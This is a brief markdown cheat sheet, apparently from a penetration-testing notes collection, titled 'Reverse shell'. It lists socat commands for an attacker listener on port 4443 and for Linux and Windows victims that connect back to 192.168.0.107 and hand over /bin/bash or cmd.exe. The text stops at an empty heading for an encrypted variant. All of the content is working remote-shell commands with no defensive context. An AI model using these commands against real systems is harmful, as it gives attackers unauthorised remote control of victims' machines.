# Reverse shell
## Socat<br>
**Attacker:** `socat -d -d TCP4-LISTEN:4443 STDOUT`<br>
**Victim:** `socat TCP4:192.168.0.107:4443 EXEC:/bin/bash`<br>
**Victim windows:** `socat TCP4:192.168.0.107:4443 EXEC:'cmd.exe',pipes`<br>

## Encrypted reverse shell
